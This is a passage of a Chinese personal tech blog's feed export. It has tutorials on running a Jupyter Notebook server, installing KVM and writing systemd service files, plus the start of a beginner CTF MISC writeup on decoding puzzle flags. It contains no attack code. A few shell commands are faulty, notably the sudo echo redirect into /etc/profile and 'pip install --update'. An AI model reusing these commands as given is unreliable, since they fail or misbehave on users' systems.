rel="noopener">[1] kvm虚拟机的四种网络模式</a></p><p><a href="https://blog.csdn.net/ccschan/article/details/88095718?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13.control" target="_blank" rel="noopener">[2] KVM虚拟化之四种网络模型</a></p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Virtualization</tag>
      
      <tag>KVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建Jupyter-Notebook服务器</title>
    <link href="/2020/06/02/%E6%90%AD%E5%BB%BAJupyter-Notebook%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/06/02/%E6%90%AD%E5%BB%BAJupyter-Notebook%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>在自己的云服务器上搭建Jupyter-Notebook服务器有以下几个好处：</p><a id="more"></a><ul><li>充分利用云服务器的计算和存储资源</li><li>统一代码环境和数据集（在不同终端机器上构建的环境是可能不一致的）</li><li>能够随时随地访问（只要ECS还没过期&amp;你的机器能上网）</li></ul><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1 环境搭建"></a>1 环境搭建</h2><h3 id="1-1-安装Python"><a href="#1-1-安装Python" class="headerlink" title="1.1 安装Python"></a>1.1 安装Python</h3><p>虽然阿里云的Ubuntu 18.04 云服务器是自带python2.7和python3.6的，但我还是选择**安装miniconda3<a href="https://docs.conda.io/en/latest/miniconda.html" target="_blank" rel="noopener">(官网)</a>**，理由如下：</p><ul><li>anaconda便于管理<strong>多版本且隔离</strong>的python环境（除此以外virtualenv和pyvenv也可，但管理方式不如conda）</li><li>miniconda比anaconda<strong>轻量</strong>，它仅包含<strong>conda和python</strong>和少量依赖包与软件包</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 从官方站点下载速度较慢，可从国内镜像站下载miniconda3-py38 64-bit</span>wget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.9.2-Linux-x86_64.sh<span class="hljs-comment"># 添加当前用户可执行权限</span>chmod u+x ./Miniconda3-py38_4.9.2-Linux-x86_64.sh<span class="hljs-comment"># 执行安装脚本，依照提示完成安装</span>./Miniconda3-py38_4.9.2-Linux-x86_64.sh<span class="hljs-comment"># 添加环境变量(非zsh用户)，若你正在使用zsh请将/etc/profile替换为~/.zshrc</span>sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">"export PATH=<span class="hljs-variable">$PATH</span>:/home/<span class="hljs-variable">$USER</span>/miniconda3/bin"</span> &gt;&gt; /etc/profile &amp; <span class="hljs-built_in">source</span> /etc/profile</code></pre></div><p>完成miniconda3的安装之后，需要使用<code>update-alternatives</code>配置<strong>多版本Python</strong>的优先级，将conda的python3.8设为默认python：</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 查看是否已经建立了python的alternative管理，若无则创建</span>sudo update-alternatives --config python<span class="hljs-comment"># 依次创建自带python2，python3以及miniconda3的python3的alternatives管理，最后的数字为优先级，越大越高</span>sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2sudo update-alternatives --install /usr/bin/python python /home/<span class="hljs-variable">$USER</span>/miniconda3/bin/python3 3</code></pre></div><h3 id="1-2-安装Jupyter"><a href="#1-2-安装Jupyter" class="headerlink" title="1.2 安装Jupyter"></a>1.2 安装Jupyter</h3><p>在命令行中输入<code>python -V</code>和<code>pip -V</code> 确认能够看到正在使用miniconda3的python和pip</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># pip换国内源以提速，在~/.pip/pip.conf中添加以下内容，文件不存在则创建</span>[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple<span class="hljs-comment"># 安装jupyter</span>pip install jupyter</code></pre></div><h2 id="2-配置Jupyter-Notebook"><a href="#2-配置Jupyter-Notebook" class="headerlink" title="2 配置Jupyter-Notebook"></a>2 配置Jupyter-Notebook</h2><h3 id="2-1-配置登陆密码"><a href="#2-1-配置登陆密码" class="headerlink" title="2.1 配置登陆密码"></a>2.1 配置登陆密码</h3><p>为了保障远程访问云服务器Jupyter服务的安全性，我们需要为notebook设定密码。（该密码会在登陆Jupyter服务时要求用户输入，若与服务器上存储的hash值匹配则放行）</p><p>以下是借助<code>IPython.lib</code>中的<code>passwd</code>函数来生成密码的sha1 code：</p><div class="hljs"><pre><code class="hljs ipython">Python <span class="hljs-number">3.8</span><span class="hljs-number">.5</span> (default, Sep  <span class="hljs-number">4</span> <span class="hljs-number">2020</span>, <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">14</span>)[GCC <span class="hljs-number">7.3</span><span class="hljs-number">.0</span>] :: Anaconda, Inc. on linuxType <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> IPython.lib <span class="hljs-keyword">import</span> passwd<span class="hljs-meta">&gt;&gt;&gt; </span>passwd()Enter password:Verify password:<span class="hljs-string">'sha1:..............YOUR-HASH-CODE....................'</span>&gt;&gt;&gt;</code></pre></div><h3 id="2-2-生成配置文件"><a href="#2-2-生成配置文件" class="headerlink" title="2.2 生成配置文件"></a>2.2 生成配置文件</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 生成 /home/$USER/.jupyter/jupyter_notebook_config.py 配置文件</span>jupyter notebook --generate-config</code></pre></div><p>由于该配置文档的所有内容均默认注释，因此可以把我们自己的配置集中追加到文尾：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#--------------------------------------------------------------------------</span><span class="hljs-comment"># User configuration</span><span class="hljs-comment">#--------------------------------------------------------------------------</span>c.NotebookApp.ip = <span class="hljs-string">'*'</span>                               <span class="hljs-comment"># notebook监听的IP</span>c.NotebookApp.port = <span class="hljs-number">8888</span>   <span class="hljs-comment"># notebook监听的端口</span>c.NotebookApp.notebook_dir = <span class="hljs-string">'/path/to/project-dirs'</span> <span class="hljs-comment"># notebook的工作目录</span>c.NotebookApp.open_browser = <span class="hljs-literal">False</span>                   <span class="hljs-comment"># 运行notebook服务时不打开浏览器</span>c.NotebookApp.password = <span class="hljs-string">u'sha1:c63cf.....45b09bed'</span>  <span class="hljs-comment"># 密码的hash 值</span></code></pre></div> <div class="note note-warning">            <p><strong>注意</strong>：notebook_dir即为notebook的<code>/</code>，因此为了保证安全性，请将notebook的工作目录设为非重要目录，如你可以创建一个<code>~/jupyter-projects</code></p>          </div> <p>完成配置之后可以启动notebook并访问啦：</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用jupyter-notebook也是一样的</span>jupyter notebook<span class="hljs-comment"># 或者更优雅一点</span>nohup jupyter notebook &gt;&gt; ~/.notebook.log 2&gt;&amp;1 &amp;</code></pre></div> <div class="note note-warning">            <p><strong>注意</strong>：记得在云服务器控制台的安全组中配置规则放行notebook监听的<code>8888</code>端口</p>          </div> <h3 id="2-3-撰写systemd服务脚本"><a href="#2-3-撰写systemd服务脚本" class="headerlink" title="2.3 撰写systemd服务脚本"></a>2.3 撰写systemd服务脚本</h3><p>将以下内容写入<code>/usr/lib/systemd/system/notebook.service</code>，若目录不存在则手动创建</p><div class="hljs"><pre><code class="hljs shell">[Unit]Description=My notebook serviceAfter=network.target[Service]<span class="hljs-meta">#</span><span class="bash">Type=simple  <span class="hljs-comment"># default simple</span></span>User=qgrainGroup=qgrainExecStart=/home/qgrain/miniconda3/bin/jupyter-notebookRestart=on-failureRestartSec=10s[Install]WantedBy=multi-user.target</code></pre></div><p>然后配置<code>notebook.service</code>自启动</p><div class="hljs"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> notebooksudo systemctl [start|stop|restart|status] notebook</code></pre></div><h2 id="3-主题美化⭐"><a href="#3-主题美化⭐" class="headerlink" title="3 主题美化⭐"></a>3 主题美化⭐</h2><h3 id="3-1-安装jupyter-themes"><a href="#3-1-安装jupyter-themes" class="headerlink" title="3.1 安装jupyter-themes"></a>3.1 安装jupyter-themes</h3><p>参考<a href="https://github.com/dunovank/jupyter-themes" target="_blank" rel="noopener">Git开源项目：jupyter-themes</a></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 安装jupyter-themes</span>pip install jupyter-themes<span class="hljs-comment"># 更新jupyter-themes至latest</span>pip install --update jupyter-themes</code></pre></div><h3 id="3-2-配置主题"><a href="#3-2-配置主题" class="headerlink" title="3.2 配置主题"></a>3.2 配置主题</h3><p><code>jupyter-themes</code>有以下几条关键命令，具体Usage请见其git仓库的README：</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有主题</span>jt -l<span class="hljs-comment"># 将主题配置为monokai</span>jt -t monokai<span class="hljs-comment"># 我的配置命令如下，这样的notebook界面极其舒适 ヾ(´▽｀)</span>jt -t monokai -f roboto -fs 12 -nfs 14 -tfs 13 -ofs 11 -dfs 10 -cellw 66% -T -N -kl</code></pre></div> <div class="note note-info">            <p>其中<strong>参数含义</strong>依次为设置主题为<code>monokai</code>，设置代码字体为<code>roboto</code>，设置代码字号为<code>12</code>，设置notebook字号为<code>14</code>，设置文本&#x2F;Markdown字号为<code>13</code>，设置输出字号为<code>11</code>，设置Pandas Dataframe字号为<code>10</code>，设置cell宽度为屏幕的<code>66%</code>，设置<code>Toolbar可见</code>，设置<code>Name&amp;Logo可见</code>以及设置<code>Kernel Logo可见</code></p>          </div> <p>具体界面效果如下（当然，passwd我为了测试，输入的是123）：</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061313149.png" srcset="/img/loading.gif"></p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><p><a href="https://bitmingw.com/2017/07/09/run-jupyter-notebook-server/" target="_blank" rel="noopener">[1] Ming’s Blog | 搭建 ipython&#x2F;jupyter notebook 服务器</a></p><p><a href="https://qgrain.github.io/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/">[2] Zhiyu’s Blog | 编写systemd服务脚本 </a></p><p><a href="https://zhuanlan.zhihu.com/p/46242116" target="_blank" rel="noopener">[3] 知乎 |【内容引起舒适】让你的Jupyter Notebook不再辣眼睛</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Selfhosted</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KVM的安装与使用</title>
    <link href="/2020/05/25/KVM%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/05/25/KVM%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p> 基于内核的虚拟机（Kernel-based Virtual Machine，简称KVM），是一种用于Linux内核中的虚拟化基础设施。KVM目前支持Intel VT及AMD-V的原生虚拟技术 </p><a id="more"></a><h2 id="1-KVM简介"><a href="#1-KVM简介" class="headerlink" title="1 KVM简介"></a>1 KVM简介</h2><ul><li><p><strong>一些概念</strong>：</p><ul><li>是x86架构且硬件支持虚拟化技术（如 intel VT 或 AMD-V）的Linux全虚拟化解决方案</li><li>它包含一个为处理器提供底层虚拟化 可加载的核心模块kvm.ko（kvm-intel.ko或kvm-AMD.ko） </li><li>KVM还需要一个经过修改的QEMU软件（qemu-kvm），作为虚拟机上层控制和界面 </li><li>在主流的Linux内核，如2.6.20以上的内核均已包含了KVM核心</li></ul></li><li><p><strong>QEMU-KVM</strong>：</p><ul><li>在Linux系统中，仅加载了KVM内核模块是不够的，用户无法直接控制内核模块去做事情，还必须有一个用户空间的工具。因此KVM的开发者选择了已成型的开源虚拟化软件QEMU，形成可控制KVM内核模块的用户空间工具QEMU-KVM</li></ul></li><li><p><strong>libvirt</strong>：</p><ul><li>Libvirt 是一套提供了多种语言接口的API，为各种虚拟化工具提供一套方便可靠的编程接口，不仅支持 KVM，而且支持 Xen 等其他虚拟机。Libvirt 不仅提供了 API，还自带一套基于文本的管理虚拟机的命令 virsh，可通过使用 virsh 命令来使用 libvirt 的全部功能</li></ul></li></ul><h2 id="2-KVM安装"><a href="#2-KVM安装" class="headerlink" title="2 KVM安装"></a>2 KVM安装</h2><h3 id="2-1-检查虚拟化支持"><a href="#2-1-检查虚拟化支持" class="headerlink" title="2.1 检查虚拟化支持"></a>2.1 检查虚拟化支持</h3><p>KVM是面向具备<code>Intel VT</code>和<code>AMD-V</code>虚拟化硬件的技术，因此首先需要check你的系统是否支持虚拟化：</p><div class="hljs"><pre><code class="hljs bash">egrep <span class="hljs-string">'(vmx|svm)'</span> /proc/cpuinfo</code></pre></div><p>能看到<code>flag *******</code>的输出即表明支持虚拟化，其中vmx对应Inter VT，svm对应ADM-V</p><h3 id="2-2-安装相关软件包"><a href="#2-2-安装相关软件包" class="headerlink" title="2.2 安装相关软件包"></a>2.2 安装相关软件包</h3><p>理论上KVM的最小安装就是<code>qemu-kvm</code>和<code>virtinst</code>，但考虑到管理上的便捷性，我们需要libvirt-daemon作为守护进程和virt-manager的GUI管理界面，以及<code>brctl</code>：</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 更新镜像源（如果有必要）</span>sudo apt-get update<span class="hljs-comment"># 安装相关软件包</span>sudo apt install qemu qemu-kvm virtinst virt-manager bridge-utils</code></pre></div><p>管理<code>libvirtd.service</code></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># systemd管理</span>sudo systemctl [start|stop|restart|enbale|<span class="hljs-built_in">disable</span>|status] libvirtd</code></pre></div><h2 id="3-KVM使用"><a href="#3-KVM使用" class="headerlink" title="3 KVM使用"></a>3 KVM使用</h2> <div class="note note-primary">            <p>所有的KVM的管理都可以从<code>virt-manager</code>图形化界面来操作，因此下面主要介绍命令行接口</p>          </div> <h3 id="3-1-创建KVM虚拟机"><a href="#3-1-创建KVM虚拟机" class="headerlink" title="3.1 创建KVM虚拟机"></a>3.1 创建KVM虚拟机</h3><h3 id="3-2-管理KVM虚拟机"><a href="#3-2-管理KVM虚拟机" class="headerlink" title="3.2 管理KVM虚拟机"></a>3.2 管理KVM虚拟机</h3><h3 id="3-3-配置虚拟机网络"><a href="#3-3-配置虚拟机网络" class="headerlink" title="3.3 配置虚拟机网络"></a>3.3 配置虚拟机网络</h3> <div class="note note-danger">            <p>To be completed… : )</p>          </div> <h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><p><a href="https://zh.wikipedia.org/zh-hans/%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA" target="_blank" rel="noopener">[1] 基于内核的虚拟机(KVM) 维基百科</a></p><p><a href="https://my.oschina.net/u/2343310/blog/1498463" target="_blank" rel="noopener">[2] kvm 虚拟化概述及 virt-manager 安装虚拟机</a></p><p><a href="https://it.ismy.fun/2018/09/18/debian-9-kvm/" target="_blank" rel="noopener">[3] Debian 9 安装 KVM 虚拟机</a></p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Virtualization</tag>
      
      <tag>KVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写systemd服务脚本</title>
    <link href="/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/"/>
    <url>/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="编写systemd服务脚本"><a href="#编写systemd服务脚本" class="headerlink" title="编写systemd服务脚本"></a>编写systemd服务脚本</h1><p>如何编写systemd服务脚本来实现服务的自启动，启动，停止和重启管理</p><a id="more"></a><h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1 背景介绍"></a>1 背景介绍</h2><ul><li><p>RHEL6&#x2F;CentOS6采用<code>/etc/init.d/xxx</code>脚本进行服务管理，但是7+版本之后由init管理升级为了由systemd管理，相应地服务管理方式也变更为由systemctl管理的service</p></li><li><p>RHEL7&#x2F;CentOS7的<code>/etc/rc.d/rc.local</code>建议创建自己的systemd服务或udev规则来进行开机自启脚本管理，建议如下：</p></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span><span class="hljs-comment">#</span><span class="hljs-comment"># It is highly advisable to create own systemd services or udev rules</span><span class="hljs-comment"># to run scripts during boot instead of using this file.</span><span class="hljs-comment">#</span><span class="hljs-comment"># In contrast to previous versions due to parallel execution during boot</span><span class="hljs-comment"># this script will NOT be run after all other services.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure</span><span class="hljs-comment"># that this script will be executed during boot.</span></code></pre></div><ul><li>因此我们应该顺应时代(工具)的变迁，学习systemd的用法🐕</li></ul><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/bg2016030703.png" srcset="/img/loading.gif"><h2 id="2-服务脚本写法"><a href="#2-服务脚本写法" class="headerlink" title="2 服务脚本写法"></a>2 服务脚本写法</h2><ul><li>CentOS7的service脚本一般存放在<code>/etc/systemd/</code>, <code>/usr/lib/systemd</code>路径下，前者包含着多个<code>*.target.wants</code>如<code>multi-user.target.wants</code>等；而后者为安装软件生成service的目录，一般编写自己的service可以放在此目录下。目录下又有<strong>system</strong>和<strong>user</strong>之分：<ul><li>**&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;**，系统服务，开机不需要用户登录即可运行的服务</li><li>**&#x2F;usr&#x2F;lib&#x2F;system&#x2F;user&#x2F;**，用户服务，需要用户登录后才能运行的服务</li></ul></li><li>每一个服务脚本文件以.service结尾，由三个区块组成: [Unit], [Service]和[Install]，以下是一个编写样例：</li></ul><div class="hljs"><pre><code class="hljs service">[Unit]   Description=test   # 简单描述服务After=network.target    # 描述服务类别，表示本服务需要在network服务启动后在启动Before=xxx.service      # 表示需要在某些服务启动之前启动，After和Before字段只涉及启动顺序，不涉及依赖关系。[Service] Type=forking     # 设置服务的启动方式User=USER        # 设置服务运行的用户Group=USER       # 设置服务运行的用户组WorkingDirectory=/PATH# 设置服务运行的路径(cwd)KillMode=control-group  # 定义systemd如何停止服务Restart=no        # 定义服务进程退出后，systemd的重启方式，默认是不重启ExecStart=/start.sh    # 服务启动命令，命令需要绝对路径（采用sh脚本启动其他进程时Type须为forking）   [Install]   WantedBy=multi-user.target  # 多用户</code></pre></div><ul><li>完成service脚本编写后，需要执行以下命令以重载生效：</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 重新加载所有的systemd服务</span>sudo systemctl daemon-reload<span class="hljs-comment"># 管理服务 [使能开启启动|启动|停止|重启|查看状态]</span>sudo systemctl [<span class="hljs-built_in">enable</span>|start|stop|restart|status] xxx.service</code></pre></div><h2 id="3-区块参数解释"><a href="#3-区块参数解释" class="headerlink" title="3 区块参数解释"></a>3 区块参数解释</h2><h3 id="Unit-区块：启动顺序与依赖关系"><a href="#Unit-区块：启动顺序与依赖关系" class="headerlink" title="[Unit]区块：启动顺序与依赖关系"></a>[Unit]区块：启动顺序与依赖关系</h3><p><strong>服务描述：</strong></p><ul><li>Description：给出当前服务的简单描述</li><li>Documentation：给出文档位置</li></ul><p><strong>启动顺序：</strong></p><ul><li>After：定义xxx.service应该在哪些target或service服务之后启动</li><li>Before：定义xxx.service应该在哪些target或service服务之前启动</li></ul><p><strong>依赖关系：</strong></p><ul><li>Wants：表示xxx.service与定义的服务存在“弱依赖”关系，即指定的服务启动失败或停止运行不影响xxx的允行</li><li>Requires：则表示”强依赖”关系，即指定服务启动失败或异常退出，那么xxx也必须退出；反之xxx启动则指定服务也会启动</li></ul><h3 id="Service-区块：启动行为定义"><a href="#Service-区块：启动行为定义" class="headerlink" title="[Service]区块：启动行为定义"></a>[Service]区块：启动行为定义</h3><p><strong>启动命令：</strong></p><ul><li>EnvironmentFile：指定当前服务的环境参数文件(路径)，如<code>EnviromentFile=-/etc/sysconfig/xxx</code>，连词号表示抑制错误，即发生错误时，不影响其他命令的执行</li><li>Environment：后面接多个不同的shell变量，如Environment&#x3D;DATA_DIR&#x3D;&#x2F;dir&#x2F;data</li><li>User：设置服务运行的用户</li><li>Group：设置服务运行的用户组</li><li>WorkingDirectory：设置服务运行的路径</li><li>Exec*：各种与执行相关的命令<ul><li>ExecStart：定义启动服务时执行的命令</li><li>ExecStop：定义停止服务时执行的命令 </li><li>ExecStartPre：定义启动服务前执行的命令 </li><li>ExecStartPost：定义启动服务后执行的命令</li><li>ExecStopPost：定义停止服务后执行的命令</li><li>ExecReload：定义重启服务时执行的命令</li></ul></li></ul><p><strong>启动类型：</strong></p><ul><li>Type：字段定义启动类型，可以设置的值如下<ul><li>simple（默认值）：<code>ExecStart</code>字段启动的进程为主进程，即直接启动服务进程</li><li>forking：<code>ExecStart</code>字段将以<code>fork()</code>方式启动，此时父进程将会退出，子进程将成为主进程（例如用shell脚本启动服务进程）</li><li>oneshot：类似于<code>simple</code>，但只<strong>执行一次</strong>，Systemd 会等它执行完，才启动其他服务</li><li>dbus：类似于<code>simple</code>，但会等待 D-Bus 信号后启动</li><li>notify：类似于<code>simple</code>，启动结束后会发出通知信号，然后 Systemd 再启动其他服务</li><li>idle：类似于<code>simple</code>，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合</li></ul></li><li>RemainAfterExit：设为<code>yes</code>，表示进程退出以后，服务仍然保持执行</li></ul><p><strong>重启行为：</strong></p><ul><li>KillMode：定义 Systemd 如何停止服务，可以设置的值如下<ul><li>control-group（default）：当前控制组里面的所有子进程，都会被杀掉</li><li>process：只杀主进程</li><li>mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号</li><li>none：没有进程会被杀掉，只是执行服务的 stop 命令</li></ul></li><li>Restart：定义了服务退出后，Systemd 的重启方式，可以设置的值如下（对于守护进程，推荐设为<code>on-failure</code>。对于那些允许发生错误退出的服务，可以设为<code>on-abnormal</code>）<ul><li>no（default）：退出后不会重启</li><li>on-success：只有正常退出时（退出状态码为0），才会重启</li><li>on-failure：非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启</li><li>on-abnormal：只有被信号终止和超时，才会重启</li><li>on-abort：只有在收到没有捕捉到的信号终止时，才会重启</li><li>on-watchdog：超时退出，才会重启</li><li>always：不管是什么退出原因，总是重启</li></ul></li><li>RestartSec：表示 Systemd 重启服务之前，需要等待的秒数</li></ul><h3 id="Install-区块：服务安装定义"><a href="#Install-区块：服务安装定义" class="headerlink" title="[Install]区块：服务安装定义"></a>[Install]区块：服务安装定义</h3><ul><li>WantedBy：表示该服务所在的 Target</li></ul><p>Target的含义是服务组，如<code>WantedBy=multi-user.target</code>指的是该服务所属于<code>multi-user.target</code>。当执行<code>systemctl enable xxx.service</code>命令时，<code>xxx.service</code>的符号链接就会被创建在<code>/etc/systemd/system/multi-user.target</code>目录下。</p><p>可以通过<code>systemctl get-default</code>命令查看系统默认启动的target，一般为<code>multi-user</code>或者是<code>graphical</code>。因此配置好相应的WantedBy字段，可以实现服务的开机启动。</p><h2 id="4-参考文章"><a href="#4-参考文章" class="headerlink" title="4 参考文章"></a>4 参考文章</h2><p><a href="https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html" target="_blank" rel="noopener">[1]【阮一峰的网络日志】Systemd 入门教程：实战篇</a></p><p><a href="https://www.cnblogs.com/wang-yc/p/8876155.html" target="_blank" rel="noopener">[2]  Centos7 自定义systemctl服务脚本</a></p><p><a href="https://blog.csdn.net/u010127879/article/details/38018825" target="_blank" rel="noopener">[3]  编写systemd下服务脚本</a></p><p><a href="https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">[4]  systemd Wiki简体中文</a></p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-MISC新手区-Writeup</title>
    <link href="/2020/04/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MISC%E6%96%B0%E6%89%8B%E5%8C%BA-Writeup/"/>
    <url>/2020/04/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MISC%E6%96%B0%E6%89%8B%E5%8C%BA-Writeup/</url>
    
    <content type="html"><![CDATA[<p>XCTF线上练习网站<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>，MISC方向的新手区Writeup。第一次做CTF练习题，第一次写Writeup(&#x2F;▽＼)</p><a id="more"></a><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p><strong>题目描述：</strong>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p><p><strong>题目分析：</strong>显然可能的选项只有两个：<code>flag{xxx}</code>和<code>flag{th1s_!s_a_d4m0_4la9}</code></p><div class="hljs"><pre><code class="hljs txt">flag&#123;th1s_!s_a_d4m0_4la9&#125;</code></pre></div><p><strong>题目总结：</strong>作为新手区的第一题它还是很友好的，并借此告诉了我们以下两点：</p><ul><li>CTF的flag一般长这样: flag{xxx}，并要注意提交的格式</li><li>CTF的flag往往就在你意想不到的地方</li></ul><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p><strong>题目描述：</strong>菜猫给了菜狗一张图，说图下面什么都没有。<a href="https://adworld.xctf.org.cn/media/task/attachments/ad00be3652ac4301a71dedd2708f78b8.pdf" target="_blank" rel="noopener">附件下载地址</a></p><p><strong>题目分析：</strong>顾题思意，菜猫说图下什么都没有，这是本题<strong>明面上的唯一线索</strong>，因此怀疑图片下藏有flag</p><ul><li>进入Aadobe Acrobat编辑模式，将图片挪开，即可得到flag</li><li>通过<a href="https://github.com/QGrain/Document-Transformer" target="_blank" rel="noopener">pandoc</a>将pdf转word也可以移开得到flag</li></ul><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411214041.png" srcset="/img/loading.gif" width="460"><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411215126.png" srcset="/img/loading.gif" width="460"><div class="hljs"><pre><code class="hljs txt">flag&#123;security_through_obscurity&#125;</code></pre></div><p><strong>题目总结：</strong>正如flag里所说，隐晦的地方往往可能藏有答案，比如图片的下面，甚至是里面（后面会遇到）</p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p><strong>题目描述：</strong>菜狗为了打败菜猫，学了一套如来十三掌。<a href="https://adworld.xctf.org.cn/media/task/attachments/833e81c19b2b4726986bd6a606d64f3c.docx" target="_blank" rel="noopener">附件下载地址</a></p><p><strong>题目分析：</strong>下载附件后发现是一个docx：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411224232.png" srcset="/img/loading.gif" width="600"><p>这段蜜汁繁体字让人不由得联想到著名的“与佛论禅”：一个加解密<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">网站</a>:</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411224839.png" srcset="/img/loading.gif" width="400"><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411225124.png" srcset="/img/loading.gif" width="400"><p>按<code>普渡众生</code>中的提示，在密文前加入<code>佛曰：</code>成功解密，得到以下加密字符串：</p><div class="hljs"><pre><code class="hljs txt">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></pre></div><p>仍然不是flag格式，怀疑仍需要解密，因此尝试常见的几种不需要密钥的加解密，此处联系题目提到的如来十三掌，因此尝试rot13解码：</p><div class="hljs"><pre><code class="hljs txt">zmxhz3tizhnjamhia3ptbmzyzghidmnrawpuzhnrdmjramrzywj9</code></pre></div><p>最终通过base64解码得到flag：</p><div class="hljs"><pre><code class="hljs txt">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></pre></div><p><strong>题目总结：</strong></p><ul><li><strong>吐血体验，正所谓“活久见”，做的题目多了，自然也熟练了</strong></li><li>也明白了MISC喜欢结合古典&#x2F;现代加密方式去隐藏密钥，奇怪的知识增长了.jpg</li></ul><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p><strong>题目描述：</strong>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。<a href="https://adworld.xctf.org.cn/media/task/attachments/4b0799f9a4d649f09a882b6b1130bb70.gif" target="_blank" rel="noopener">附件下载地址</a></p><p><strong>题目分析：</strong>下载的附件先尝试一下打开看看是否能得到什么信息，结果发现gif的最后一帧有一张二维码一闪而过，除非你是<strong>多年练就的神手速</strong>，不然是截不到的。</p><p>因此得另寻他法，此处推荐一个隐写解析的强力工具<a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve" target="_blank" rel="noopener">StegSolve</a>，通过Frame 